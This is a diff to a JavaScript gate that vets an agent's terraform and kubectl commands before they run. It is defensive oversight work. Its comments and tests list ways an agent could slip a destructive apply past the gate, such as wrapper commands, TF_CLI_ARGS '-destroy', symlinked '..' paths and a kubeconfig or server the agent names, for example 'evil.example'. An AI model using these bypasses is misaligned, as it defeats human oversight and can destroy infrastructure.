@@ -24,10 +24,10 @@ import {accessSync, constants, lstatSync, openSync, readSync, closeSync, readdir
 import {spawnSync} from "node:child_process";
 import {createHash} from "node:crypto";
 import {homedir} from "node:os";
-import {basename, isAbsolute, join, resolve} from "node:path";
+import {basename, dirname, isAbsolute, join, resolve} from "node:path";
 import {fileURLToPath} from "node:url";
 
-export const INFRA_DEFAULTS = {enabled: true, destroy: "deny", require_plan_in_prod: false, kubectl_diff: false, timeout_ms: 4000};
+export const INFRA_DEFAULTS = {enabled: true, destroy: "deny", require_plan_in_prod: false, kubectl_diff: false, timeout_ms: 3000};
 /** User settings (config.json `infra`) with the team's stricter parts: a team can force deny-on-destroy or a saved plan in prod. */
 export function infraSettings(saved, team) {
   const s = {...INFRA_DEFAULTS, ...(saved && typeof saved === "object" && !Array.isArray(saved) ? saved : {})};
@@ -44,7 +44,7 @@ export function infraError(saved) {
   for (const k of ["enabled", "require_plan_in_prod", "kubectl_diff"]) if (saved[k] !== undefined && typeof saved[k] !== "boolean") return `infra.${k} must be true or false`;
   if (saved.destroy !== undefined && !["deny", "ask"].includes(saved.destroy)) return 'infra.destroy must be "deny" or "ask"';
   // the hook has 10 s in all: a plan read that could take most of it would let the command through
-  if (saved.timeout_ms !== undefined && !(Number.isInteger(saved.timeout_ms) && saved.timeout_ms >= 100 && saved.timeout_ms <= 6000)) return "infra.timeout_ms must be 100 to 6000";
+  if (saved.timeout_ms !== undefined && !(Number.isInteger(saved.timeout_ms) && saved.timeout_ms >= 100 && saved.timeout_ms <= 4000)) return "infra.timeout_ms must be 100 to 4000";
   return null;
 }
 
@@ -59,8 +59,15 @@ export function countPlan(json) {
   if (!j || typeof j !== "object" || typeof j.format_version !== "string" || !("planned_values" in j) || j.errored === true) return null;
   if (j.resource_changes !== undefined && !Array.isArray(j.resource_changes)) return null;
   const p = {create: 0, update: 0, delete: 0, replace: 0, stateful: [], destroyed: []};
+  // code that runs at apply time whatever the counts say: provisioners (local-exec), a data source read
+  // deferred to apply (external, http), actions. Such a plan is never passed on its counts alone.
+  const runs = [];
+  const walk = m => { for (const r of m?.resources ?? []) if (r?.provisioners?.length) runs.push(`provisioner in ${r.address}`);
+    for (const c of Object.values(m?.module_calls ?? {})) walk(c?.module); };
+  walk(j.configuration?.root_module);
+  if (Array.isArray(j.action_invocations) && j.action_invocations.length) runs.push("action invocations");
   for (const rc of j.resource_changes ?? []) {
-    if (rc?.mode === "data") continue;
+    if (rc?.mode === "data") { if (rc.change?.actions?.includes("read") && /^(external|http)$/.test(rc.type)) runs.push(`data read at apply: ${rc.address}`); continue; }
     const a = rc?.change?.actions;
     if (!Array.isArray(a)) return null;
     const k = a.join(",");
@@ -75,6 +82,7 @@ export function countPlan(json) {
       if (statefulType(rc.type)) p.stateful.push(addr);
     }
   }
+  if (runs.length) p.runs = runs;
   return p;
 }
 
@@ -119,6 +127,9 @@ export function readPlan(dir, file, {deadline, env = process.env} = {}) {
   const head = Buffer.alloc(4);
   try { const fd = openSync(path, "r"); readSync(fd, head, 0, 4, 0); closeSync(fd); } catch { return {why: `${file} is not readable`}; }
   if (head.toString("latin1") !== "PK\x03\x04") return {why: `${file} is not a saved plan`};
+  // the physical directory, for production markers (a `current` symlink to envs/prod); a .. never passes (terraformApply)
+  let real;
+  try { real = realpathSync(path); } catch { return {why: `${file} is not readable`}; }
   const stale = staleBy(dir, st.mtimeMs);
   if (stale) return {why: `stale: ${stale} changed after ${file} was written`};
   const bin = which("terraform", env.PATH);
@@ -130,33 +141,52 @@ export function readPlan(dir, file, {deadline, env = process.env} = {}) {
   if (r.status !== 0) return {why: `terraform show failed (${(r.err.trim().split("\n").find(l => l.trim()) ?? `exit ${r.status}`).replace(/[^\x20-\x7e]/g, "").slice(0, 80)})`};
   const plan = countPlan(r.out);
   if (!plan) return {why: `${file} did not read as a complete plan`};
-  return {plan: {...plan, digest: sha(r.out)}};
+  const realDir = realpathSync(dir);
+  return {plan: {...plan, digest: sha(r.out)}, realDir, realPlanDir: dirname(real)};
 }
 
 // ---------------------------------------------------------------------------------------------
 // The command line. Leading words that only wrap a program, then the program's own arguments.
-const WRAP = /^(rtk|time|nohup|command|builtin|exec|nice)$/;
+// `strict`: only wrappers that change nothing about what runs where (rtk, time, nohup, command,
+// timeout N). An assignment (PATH=., TF_CLI_ARGS_apply=-destroy), env, sudo or nice can change the
+// binary, its arguments or its directory: the command is still found, but it never passes on a plan.
+const WRAP = /^(rtk|time|nohup|command)$/;
 function program(words) {
-  let i = 0;
+  let i = 0, strict = true;
   while (i < words.length) {
     const v = words[i].value;
-    if (/^[A-Za-z_]\w*=/.test(v) || WRAP.test(v) || (v === "proxy" && words[i - 1]?.value === "rtk")) { i++; continue; }
-    if (v === "env") { i++; while (i < words.length && (/^[A-Za-z_]\w*=/.test(words[i].value) || /^-/.test(words[i].value))) i++; continue; }
-    if (v === "timeout") { i++; while (i < words.length && /^-/.test(words[i].value)) i += /^-[ks]$/.test(words[i].value) ? 2 : 1; i++; continue; }
+    if (WRAP.test(v) || (v === "proxy" && words[i - 1]?.value === "rtk")) { i++; continue; }
+    if (/^[A-Za-z_]\w*=/.test(v) || v === "builtin" || v === "exec" || v === "nice") { strict = false; i++; continue; }
+    if (v === "env") { strict = false; i++; while (i < words.length && (/^[A-Za-z_]\w*=/.test(words[i].value) || /^-/.test(words[i].value))) i += /^-[CSu]$/.test(words[i].value) ? 2 : 1; continue; }
+    if (v === "sudo" || v === "doas") { strict = false; i++; while (i < words.length && /^-/.test(words[i].value)) i += /^-[ugCDhpRTUr]$/.test(words[i].value) ? 2 : 1; continue; }
+    if (v === "timeout") {
+      i++;
+      if (!/^\d+(\.\d+)?[smhd]?$/.test(words[i]?.value ?? "")) strict = false;
+      while (i < words.length && /^-/.test(words[i].value)) i += /^-[ks]$/.test(words[i].value) ? 2 : 1;
+      i++; continue;
+    }
     break;
   }
-  return words.slice(i);
+  const out = words.slice(i);
+  out.strict = strict;
+  return out;
 }
 // terraform [-chdir=DIR] apply [options] [PLAN]. Go's flag package: -x and --x, a value after = or as
 // the next word for the options that take one. Returns {chdir, plan} or null when it is not an apply.
 const TF_VALUE = new Set(["var", "var-file", "target", "replace", "lock-timeout", "parallelism", "state", "state-out", "backup"]);
+// Only these options leave a saved plan apply exactly the plan; anything else (--destroy, -target,
+// -state-out, -exclude, a future option) makes the command not pass on a plan.
+const TF_PASS = /^--?(auto-approve|input=false|no-color|compact-warnings|json|lock-timeout=\d+[smh]?|parallelism=\d+)$/;
 export function terraformApply(words) {
   if (!words.length || basename(words[0].value) !== "terraform") return null;
+  // ./terraform, bin/../terraform: an agent's own program, not the terraform that read the plan
+  let exact = words[0].value === "terraform";
   let i = 1, chdir = null;
   for (; i < words.length && words[i].value.startsWith("-"); i++) {
     const m = words[i].value.match(/^--?chdir=(.*)$/);
     if (m) chdir = m[1];
     else if (/^--?chdir$/.test(words[i].value)) return {unreadable: "-chdir needs -chdir=DIR"};
+    else exact = false;
   }
   if (words[i]?.value !== "apply") return null;
   const positional = [];
@@ -164,11 +194,14 @@ export function terraformApply(words) {
     const v = words[i].value;
     if (v === "--") { positional.push(...words.slice(i + 1).map(w => w.value)); break; }
     if (!v.startsWith("-") || v === "-") { positional.push(v); continue; }
+    if (!TF_PASS.test(v)) exact = false;
     const name = v.replace(/^--?/, "").split("=")[0];
     if (!v.includes("=") && TF_VALUE.has(name)) i++;
   }
   if (positional.length > 1) return {chdir, unreadable: "more than one plan file"};
-  return {chdir, plan: positional[0] ?? null};
+  // a .. is resolved here by the text and by Terraform through the symlinks on the way: no pass on it
+  if ([chdir, positional[0]].some(x => x != null && /(^|\/)\.\.(\/|$)/.test(x))) exact = false;
+  return {chdir, plan: positional[0] ?? null, exact};
 }
 // kubectl [globals] apply|delete|replace|patch ...; the verb is the first word that is one of them
 // and not the value of a global option that takes one.
@@ -209,6 +242,10 @@ function kubeCheck(k, dir, s, deadline, env) {
   // nothing that could make the dry run real or read what we cannot give it: a dry run already, --
   // (the rest is not flags), stdin, --raw (a URL request that ignores --dry-run), an editor
   if (a.some(x => /^--dry-run(=|$)|^--raw(=|$)|^--edit$|^--?$/.test(x)) || a.some((x, i) => (/^(-f|--filename)$/.test(x) && a[i + 1] === "-") || /^(-f-|--filename=-)$/.test(x))) return null;
+  // not with a kubeconfig, server or token the command names (it could be the agent's: an exec
+  // credential plugin runs code, a server of its own receives the user's credentials), nor its own -o
+  if (a.some(x => /^(--kubeconfig|--server|-s|--token|-o|--output)(=|$)|^-o\S/.test(x))) return null;
+  if (String(env.KUBECONFIG ?? "").split(":").some(f => f && (!isAbsolute(f) || (dir + "/").startsWith(resolve(f, "..") + "/") || resolve(f).startsWith(dir + "/")))) return null;
   const bin = which("kubectl", env.PATH);
   if (!bin || deadline - Date.now() < 50) return null;
   const {KUBECTL_EXTERNAL_DIFF, ...kenv} = env;   // our own parser reads the default unified diff
@@ -218,7 +255,8 @@ function kubeCheck(k, dir, s, deadline, env) {
     const d = countDiff(r.out);
     return {kind: "kubectl", ...d, deleted: d.deleted.length, digest: sha(r.out)};
   }
-  const r = run(bin, [...a.slice(1), "--dry-run=server", "-o", "name"], dir, kenv, deadline - Date.now());
+  // right after the verb: a flag of the agent's left waiting for a value must not swallow --dry-run
+  const r = run(bin, [...a.slice(1, k.at + 1), "--dry-run=server", "-o", "name", ...a.slice(k.at + 1)], dir, kenv, deadline - Date.now());
   if (r.timedOut || r.status !== 0) return null;
   const names = r.out.split("\n").map(l => l.trim()).filter(Boolean);
   const gone = k.verb === "delete" || (k.verb === "replace" && a.includes("--force")) ? names : [];
@@ -235,40 +273,48 @@ const FIX = "run `terraform plan -out=tfplan` and apply the plan file (terraform
  * command was a verified clean plan (allow-eligible); null outcome carries only the counts.
  * `prod(dir)`: whether the command, run in dir, is production (the gate's markers).
  */
-export function planGate({command, cwd, settings: s, prod, pipelines, shellWords, env = process.env}) {
+export function planGate({command, cwd, settings: s, settingsAt = () => s, prod, pipelines, shellWords, env = process.env}) {
   if (!s?.enabled || !/\b(terraform|kubectl)\b/.test(command)) return null;
   const ps = pipelines(command);
   if (!ps) return null;   // an expansion, a heredoc or unbalanced quotes: the rules and the usual judge decide
-  const deadline = Date.now() + s.timeout_ms, parts = [];
-  let dir = cwd && isAbsolute(cwd) ? cwd : null, other = false;
+  const deadline = Date.now() + s.timeout_ms, parts = [], prodAt = prod;
+  let dir = cwd && isAbsolute(cwd) ? cwd : null, other = false, dotdot = false;
+  // a cd is followed only across && ; and newlines: in a pipe or behind & it runs in a subshell, and
+  // after || the next command runs only when it failed. ponytail: a || or & anywhere, even quoted, stops it.
+  const cdOk = !/\|\||(?<![&>])&(?![&>])/.test(command);
+  // TF_CLI_ARGS in the hook's environment reaches the apply too: nothing passes on a plan then
+  const tfArgs = Object.keys(env).some(k => /^TF_CLI_ARGS/.test(k));
   for (const p of ps) {
-    for (const seg of p.core.split(/(?<!\|)\|(?!\|)/)) {
+    const segs = p.core.split(/(?<!\|)\|(?!\|)/);
+    for (const seg of segs) {
       const words = shellWords(seg.replace(/^[\s({!]+|[\s)}]+$/g, "")) ?? [];
       const w = program(words);
       if (!w.length) continue;
       if (w[0].value === "cd") {
         const to = w[1]?.value;
-        dir = w.length > 2 || !to || to === "-" || !dir && !isAbsolute(to) && !to.startsWith("~") ? null
+        dir = !cdOk || segs.length > 1 || w.length > 2 || !to || to === "-" || /^~[^/]/.test(to) || !dir && !isAbsolute(to) && !to.startsWith("~") ? null
           : to.startsWith("~") ? join(homedir(), to.slice(1)) : resolve(dir ?? "/", to);
+        if (/(^|\/)\.\.(\/|$)/.test(to ?? "")) dotdot = true;
         if (ps.length > 1 && /[()]/.test(p.core)) dir = null;   // a subshell's cd: not followed
         continue;
       }
       const tf = terraformApply(w), kube = !tf && s.kubectl_diff ? kubectlChange(w) : null;
       if (!tf && !kube) { other = true; continue; }
       const here = tf?.chdir != null ? (dir ? resolve(dir, tf.chdir) : null) : dir;
-      parts.push({tf, kube, dir: here, prod: prod(here ?? cwd ?? "")});
+      parts.push({tf, kube, dir: here, prod: prod(here ?? cwd ?? ""), strict: w.strict && !!tf?.exact && !tfArgs && !dotdot && segs.length === 1});
     }
   }
   if (!parts.length) return null;
-  const results = parts.map(({tf, kube, dir, prod}) => {
+  const results = parts.map(({tf, kube, dir, prod, strict}) => {
+    const sd = dir ? settingsAt(dir) : s;
     if (kube) {
       const k = dir ? kubeCheck(kube, dir, s, deadline, env) : null;
       if (!k) return null;
-      if (k.flagged.length) return {outcome: s.destroy, id: "kube-destroy", plan: k, rule: `kubectl ${kube.verb} deletes ${k.deleted}: ${list(k.flagged)} (namespace, volume, statefulset or CRD)`};
+      if (k.flagged.length) return {outcome: sd.destroy, id: "kube-destroy", plan: k, rule: `kubectl ${kube.verb} deletes ${k.deleted}: ${list(k.flagged)} (namespace, volume, statefulset or CRD)`};
       if (k.deleted) return {outcome: "ask", id: "kube-delete", plan: k, rule: `kubectl ${kube.verb} deletes ${k.deleted} object${k.deleted === 1 ? "" : "s"} (server dry run)`};
       return {outcome: null, id: "kube-diff", plan: k, rule: `kubectl ${kube.verb} changes ${k.changed} object${k.changed === 1 ? "" : "s"} (server dry run)`};
     }
-    const noPlan = prod && s.require_plan_in_prod ? "deny" : "ask";
+    const noPlan = prod && sd.require_plan_in_prod ? "deny" : "ask";
     if (tf.unreadable) return {outcome: noPlan, id: "plan-unreadable", rule: `no readable saved plan (${tf.unreadable}): ${FIX}`};
     if (!tf.plan) return {outcome: noPlan, id: "plan-missing", rule: `terraform apply without a saved plan: ${FIX}`};
     if (!dir) return {outcome: noPlan, id: "plan-unreadable", rule: `no readable saved plan (the directory it runs in is unknown): ${FIX}`};
@@ -278,10 +324,13 @@ export function planGate({command, cwd, settings: s, prod, pipelines, shellWords
     const plan = {kind: "terraform", create: p.create, update: p.update, delete: p.delete, replace: p.replace, stateful: p.stateful, digest: p.digest};
     if (p.delete + p.replace) {
       const addrs = [...p.destroyed.filter(d => d.stateful), ...p.destroyed.filter(d => !d.stateful)].map(d => d.address);
-      return {outcome: s.destroy, id: "plan-destroy", plan, rule: `plan destroys ${addrs.length}: ${list(addrs)}${p.replace ? ` (${p.replace} replace)` : ""}` +
+      return {outcome: sd.destroy, id: "plan-destroy", plan, rule: `plan destroys ${addrs.length}: ${list(addrs)}${p.replace ? ` (${p.replace} replace)` : ""}` +
         (p.stateful.length ? `; stateful: ${list(p.stateful)}` : "")};
     }
-    if (prod) return {outcome: "ask", id: "plan-prod", plan, rule: `production apply of a verified saved plan (${counts})`};
+    // production also by the physical directory (a `current` symlink to envs/prod)
+    if (prod || (r.realDir !== dir && prodAt(r.realDir)) || (r.realPlanDir !== r.realDir && prodAt(r.realPlanDir))) return {outcome: "ask", id: "plan-prod", plan, rule: `production apply of a verified saved plan (${counts})`};
+    if (p.runs) return {outcome: null, id: "plan-runs-code", plan, rule: `verified saved plan (${counts}) that runs code at apply: ${list(p.runs, 3)}`};
+    if (!strict) return {outcome: null, id: "plan-clean", plan, rule: `verified saved plan: ${counts} (not passed: the command changes what runs, how or where)`};
     return {outcome: "pass", id: "plan-clean", plan, rule: `verified saved plan: ${counts}`};
   });
   // a kubectl check that could not run: that part is judged as before, and nothing passes on it
@@ -301,7 +350,7 @@ export function planGate({command, cwd, settings: s, prod, pipelines, shellWords
 // kubectl on PATH that log every call. No real binary, cluster or cloud is touched.
 async function selfcheck() {
   const {default: assert} = await import("node:assert/strict");
-  const {chmodSync, existsSync, mkdtempSync, mkdirSync, readFileSync, rmSync, utimesSync, writeFileSync} = await import("node:fs");
+  const {chmodSync, existsSync, mkdtempSync, mkdirSync, readFileSync, rmSync, symlinkSync, utimesSync, writeFileSync} = await import("node:fs");
   const {tmpdir} = await import("node:os");
   const {pipelines, shellWords} = await import("./gate.mjs");
   const here = fileURLToPath(new URL(".", import.meta.url)), fixture = n => readFileSync(join(here, "setup/tool-gate/plans", `${n}.json`), "utf8");
@@ -337,9 +386,12 @@ async function selfcheck() {
       !statefulType("aws_s3_bucket_policy") && !statefulType("aws_instance"), "stateful types");
     // parsing
     const tfa = c => terraformApply(shellWords(c));
-    assert.deepEqual(tfa("terraform apply tfplan"), {chdir: null, plan: "tfplan"});
-    assert.deepEqual(tfa("terraform -chdir=envs/dev apply -auto-approve -lock-timeout 30s -input=false tfplan"), {chdir: "envs/dev", plan: "tfplan"});
-    assert.deepEqual(tfa("terraform apply -auto-approve -var env=dev -var-file dev.tfvars"), {chdir: null, plan: null});
+    assert.deepEqual(tfa("terraform apply tfplan"), {chdir: null, plan: "tfplan", exact: true});
+    assert.deepEqual(tfa("terraform -chdir=envs/dev apply -auto-approve -lock-timeout=30s -input=false tfplan"), {chdir: "envs/dev", plan: "tfplan", exact: true});
+    assert.deepEqual(tfa("terraform apply -auto-approve -var env=dev -var-file dev.tfvars"), {chdir: null, plan: null, exact: false});
+    for (const c of ["./terraform apply tfplan", "bin/../terraform apply tfplan", "terraform apply --destroy tfplan", "terraform apply -target=x tfplan",
+                     "terraform apply -state-out=x tfplan", "terraform apply -exclude tfplan", "terraform -version apply tfplan"])
+      assert.equal(tfa(c).exact, false, `not exact: ${c}`);
     assert.equal(tfa("terraform apply a b").unreadable, "more than one plan file");
     assert.equal(tfa("terraform plan -out=tfplan"), null);
     assert.equal(tfa("terraform show tfplan"), null);
@@ -356,6 +408,38 @@ async function selfcheck() {
     assert.deepEqual([g.plan.create, g.plan.update, g.plan.delete, g.plan.replace, g.plan.kind], [1, 1, 0, 0, "terraform"]);
     assert.equal(gate("cd w && terraform apply clean.plan", tmp).outcome, "pass", "a cd before the apply is followed");
     assert.equal(gate("rtk proxy timeout 60 terraform apply -auto-approve clean.plan", w).outcome, "pass", "wrappers");
+    assert.equal(gate("sudo -u deploy env TF_LOG=info terraform apply", w).id, "plan-missing", "sudo and env wrappers");
+    // review round 1: nothing passes unless what runs is exactly the plan that was read
+    put(w, "tfplan", fixture("destroy"));
+    put(join(w, "sub"), "tfplan", fixture("clean"));
+    for (const c of ["cd sub | terraform apply tfplan", "cd sub & terraform apply tfplan", "cd sub || terraform apply tfplan"])
+      assert.notEqual(gate(c, w).outcome, "pass", `a cd that does not carry over: ${c}`);
+    assert.equal(gate("cd sub && terraform apply tfplan", w).outcome, "pass", "a cd across && is followed");
+    assert.equal(gate("cd sub; terraform apply tfplan", w).outcome, "pass", "and across ;");
+    assert.equal(gate("cd ~bob && terraform apply tfplan", w).id, "plan-unreadable", "~name is another user's home");
+    for (const c of ["./terraform apply clean.plan", "PATH=. terraform apply clean.plan", "TF_CLI_ARGS_apply='-destroy' terraform apply clean.plan",
+                     "env --chdir=/ terraform apply clean.plan", "env -i terraform apply clean.plan", "sudo terraform apply clean.plan", "nice terraform apply clean.plan",
+                     "terraform apply --destroy clean.plan", "terraform apply -target=x clean.plan", "terraform apply -state-out=x clean.plan", "timeout --foo 5 terraform apply clean.plan"]) {
+      const r = gate(c, w);
+      assert.ok(r && r.outcome !== "pass" && r.plan?.create === 1, `no pass, the counts kept: ${c} ${JSON.stringify(r)}`);
+    }
+    assert.equal(gate("terraform apply clean.plan", w, {}, () => false, {...env, TF_CLI_ARGS_apply: "-destroy"}).outcome, null, "TF_CLI_ARGS in the hook's environment");
+    // symlinks: the physical path is what Terraform opens; production by the physical directory
+    symlinkSync(join(w, "sub"), join(w, "lnk"));
+    mkdirSync(join(w, "far/deep"), {recursive: true}); put(join(w, "far"), "clean.plan", fixture("destroy")); symlinkSync(join(w, "far/deep"), join(w, "lnk2"));
+    assert.equal(gate("terraform apply lnk2/../clean.plan", w).outcome, null, "a .. through a symlink: Terraform opens far/clean.plan, no pass");
+    assert.equal(gate("terraform -chdir=lnk2/.. apply clean.plan", w).outcome, null, "-chdir with ..");
+    assert.equal(gate("cd lnk2/.. && terraform apply clean.plan", w).outcome, null, "cd with ..");
+    assert.equal(gate("cd lnk && terraform apply tfplan", w).outcome, "pass", "a symlinked directory without ..: the same file either way");
+    assert.equal(gate("cd lnk && terraform apply tfplan", w, {}, d => d.endsWith("/sub")).outcome, "ask", "production by the physical directory");
+    // code that runs at apply: provisioners, deferred external reads, actions
+    const withRuns = extra => JSON.stringify({...JSON.parse(fixture("clean")), ...extra});
+    put(w, "prov.plan", withRuns({configuration: {root_module: {module_calls: {m: {module: {resources: [{address: "null_resource.x", provisioners: [{type: "local-exec"}]}]}}}}}}));
+    assert.equal(gate("terraform apply prov.plan", w).id, "plan-runs-code", "a provisioner in a module");
+    put(w, "ext.plan", withRuns({resource_changes: [{address: "data.external.x", mode: "data", type: "external", name: "x", change: {actions: ["read"]}}]}));
+    assert.equal(gate("terraform apply ext.plan", w).outcome, null, "a data external read at apply");
+    put(w, "act.plan", withRuns({action_invocations: [{address: "action.x"}]}));
+    assert.equal(gate("terraform apply act.plan", w).outcome, null, "actions");
     g = gate("terraform apply clean.plan && rm -rf build", w);
     assert.ok(g.outcome === null && g.plan.create === 1, "anything else in the command: the counts only, no pass");
     assert.equal(gate("terraform apply clean.plan | tee out.log", w).outcome, null);
@@ -436,12 +520,19 @@ async function selfcheck() {
     assert.equal(gate("kubectl apply -f -", w, k), null, "stdin: not run");
     assert.equal(gate("kubectl delete --raw /api/v1/namespaces/x", w, k), null, "--raw: not run");
     const kcalls = readFileSync(log, "utf8").trim().split("\n");
-    assert.ok(kcalls.every(l => (/ diff( |$)/.test(l) && !/ apply( |$)/.test(l)) || / --dry-run=server -o name$/.test(l)), `only diff or a server dry run: ${kcalls.join(" | ")}`);
-    assert.ok(kcalls.includes("kubectl --context dev delete ns payments --dry-run=server -o name"));
+    assert.ok(kcalls.every(l => (/ diff( |$)/.test(l) && !/ apply( |$)/.test(l)) || / (delete|replace|patch) --dry-run=server -o name( |$)/.test(l)), `only diff or a server dry run: ${kcalls.join(" | ")}`);
+    assert.ok(kcalls.includes("kubectl --context dev delete --dry-run=server -o name ns payments"), kcalls.join(" | "));
+    // review round 1: an agent flag waiting for a value cannot swallow --dry-run; no agent kubeconfig, server, token or -o
+    gate("kubectl delete pod web-1 --field-manager", w, k, () => false, kenv({KUBE_NAMES: "pod/web-1\n"}));
+    assert.equal(readFileSync(log, "utf8").trim().split("\n").at(-1), "kubectl delete --dry-run=server -o name pod web-1 --field-manager");
+    for (const c of ["kubectl --kubeconfig ./kc delete pod x", "kubectl --server https://evil.example delete pod x", "kubectl delete pod x -o yaml",
+                     "kubectl delete pod x --output=json", "kubectl --token=t delete pod x"])
+      assert.equal(gate(c, w, k, () => false, kenv({KUBE_NAMES: "pod/x\n"})), null, `not run: ${c}`);
+    assert.equal(gate("kubectl delete pod x", w, k, () => false, kenv({KUBE_NAMES: "pod/x\n", KUBECONFIG: join(w, "kc")})), null, "a KUBECONFIG inside the working directory");
 
     // settings
     assert.equal(infraError({destroy: "allow"}), 'infra.destroy must be "deny" or "ask"');
-    assert.equal(infraError({timeout_ms: 60000}), "infra.timeout_ms must be 100 to 6000");
+    assert.equal(infraError({timeout_ms: 6000}), "infra.timeout_ms must be 100 to 4000");
     assert.match(infraError({kubectl: true}), /unknown key/);
     assert.equal(infraError({destroy: "ask", kubectl_diff: true}), null);
     assert.equal(infraSettings({destroy: "ask"}, {destroy: "deny"}).destroy, "deny", "a team can force deny");
